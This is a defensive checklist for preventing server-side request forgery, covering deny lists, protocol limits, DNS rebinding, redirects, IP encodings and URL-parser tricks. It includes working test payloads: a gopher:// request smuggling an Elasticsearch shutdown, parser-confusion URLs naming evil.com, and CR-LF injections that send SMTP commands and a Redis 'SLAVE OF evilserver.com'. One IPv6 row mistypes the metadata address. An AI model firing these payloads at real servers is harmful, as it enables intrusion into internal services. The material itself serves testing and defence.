# Server Side Request Forgery (SSRF) Checklist

<img src="images/ssrf.png" align="left"/>

Server-Side Request Forgery (SSRF) allows an attacker to have a server perform network calls in the context of that server. Common exploits will communicate to backend services via HTTP, but other protocols are also possible via protocol smuggling.

Impact of SSRF can vary, but can be especially severe in cloud environments due to cloud provider's metadata services revealing sensitive data. Avoid processing user supplied URLs if possible. Otherwise this checklist can help cover some common vectors.

## Mitigation Checklist
- [ ] Ensure that IP deny lists are comprehensive
- [ ] Enforce only defined protocols are processed (E.g. only HTTP/HTTPS)
- [ ] Ensure that DNS name resolutions don’t bypass any checks
- [ ] Ensure that HTTP redirects don’t bypass any checks
- [ ] Ensure that the IPv6 addresses don’t bypass any checks
- [ ] Ensure that uncommon representations of IPs don’t bypass any checks
- [ ] Ensure user controlled data is the expected type
- [ ] Ensure abusing URL parsing doesn’t bypass checks
- [ ] Ensure CR-LF & Unicode characters get encoded correctly
- [ ] Minimize user controlled data that is processed

## Ensure that IP deny lists are comprehensive

There's probably not a legitimate use case for a user to have a server request something in the private IP space, the loopback address, or the AWS metadata endpoint. Ensure that you have all the following IPs in your disallow list.

|   |   |
|---|---|
| 127.0.0.1/8 | Loopback |
| 10.0.0.0/8 | Private IP Address Block |
| 172.16.0.0/12 | Private IP Address Block |
| 192.168.0.0/16 | Private IP Address Block |
| 169.254.169.254/32 | AWS Metadata Endpoint |

## Enforce only defined protocols are processed (E.g. only HTTP/HTTPS)

Configure the service to only use explicitly defined protocols. E.g. only allow HTTP/HTTPS. Not defining the protocol can allow protocol smuggling.

This request:
```
gopher://127.0.0.1:9200/_POST%20/shutdown%20HTTP/1.1%0AUser-Agent%3A%20curl/
7.35.0%0AHost%3A%20127.0.0.1%0AAccept%3A%20*/*%0AContent-Length%3A23%0AContent-Type%3A+application/
x-www-form-urlencoded%0AConnection%3A+close%0A%0AIm%20the%20request%20body%20now
```
Creates the following call to an elasticsearch server:
```
POST /shutdown HTTP/1.1
User-Agent: curl/7.35.0
Host: 127.0.0.1
Accept: */*
Content-Length: 23
Content-Type: application/x-www-form-urlencoded
Connection: close

Im the request body now
```

## Ensure that DNS name resolutions don’t bypass any checks

DNS rebinding attacks will resolve subdomains to internal IP addresses. Sites like xip.io provide this functionality. You can use this for testing. Ensure these resolutions will also be blocked by IP disallow lists.

|   |   |
|---|---|
| http://169.254.169.254.xip.io/ | http://169.254.169.254 |

## Ensure that HTTP redirects don’t bypass any checks

An attacker may host a server where they can set the response headers of a request to point to internal IPs. URL shortening services like bitly also can provide this functionality. You can use this for testing. Ensure redirects will also be blocked by IP disallow lists.

|   |   |
|---|---|
| https://bit.ly/2Gr1XnX | http://169.254.169.254 |

Also ensure that redirects will only process the predefined protocols.

### Ensure that the IPv6 addresses don’t bypass any checks

IPv4 can be represented as IPv6 addresses. Make sure these don’t bypass IP disallow lists.
| IPv4 | IPv6|
|---|---|
| 127.0.0.1 | 0:0:0:0:0:ffff:7f00:1 |
| 69.254.169.254 | 0:0:0:0:0:ffff:a9fe:a9fe |


## Ensure that uncommon representation of IPs don’t bypass any checks

Many libraries and binaries will process IPs represented as 32 bit ints, hex, or octal. Make sure that these don’t bypass the IP disallow lists.

| IP | 32bit Int | Hex | Octal |
|---|---|---|---|
| 127.0.0.1 | 2130706433 <br /> 0 | 0x7f000001 <br /> 0x0 | |
| 169.254.169.254 | 2852039166 | 0xa9fea9fe | |

You can test this out locally with ping or other binaries. (Note: `ping 0` resolves on linux, but not mac)

```
$ ping 2130706433
PING 2130706433 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.018 ms
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.046 ms
```

## Ensure user controlled data is the expected type

```
axios.request(req.data.url).then(function(res) {...})
```
Some JS http client functions accept either a string or config object to create a request. An attacker could set the url parameter to be a config object. Similar issues can exist in other languages when assuming user input type. Ensure all user data is the expected data type.

Note: The impact of this vector can be more severe if the docker daemon is accessible from the app. Axios and some other JS request libraries support communicating over Unix sockets (See here). This results in RCE.

## Ensure "abusing URL parsers" vectors don’t bypass checks

Ensure that the URL that was parsed and validated is the same that will be fetched by http client.

```
http://myvalidserver.com:8080@attackerserver.com
```

By including an `@`, most URL parsing libs will evaluate the server portion of the URL as `attackerserver.com` The following is vulnerable to allow an attacker to specify the host of the request.

```
axios.get(`http://myvalidserver.com:8080${req.data.path}`)
```

Include a trailing / before the user controlled path to avoid this vulnerability.

The following patterns may also be used for testing:
```
http://127.0.0.1:11211:80/
http://foo@evil.com:80@google.com/
http://foo@127.0.0.1 @google.com/
http://google.com#@evil.com/
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
http://127.0.0.1\tfoo.google.com
```

Ref: https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf

## Ensure CR-LF & Unicode characters get encoded correctly

Make sure CR-LF characters stay encoded and don’t allow CR-LF injection
```
http://127.0.0.1:25/%0D%0AHELO orange.tw%0D%0AMAIL FROM
http://127.0.0.1:25/\r\nSLAVE OF evilserver.com\r\n
```

```
http://myserver.com//passwd
http://myserver.com/xFF/x2E/xFF/x2E/passwd
```

## Minimize user controlled data that is processed

Nothing to test here. Just a note to evaluate if any user controlled parameters can be removed to reduce risk.

<br><br>
:warning: This list attempts to be comprehensive. Feel free to open an issue or PR for missing or incomplete vectors.
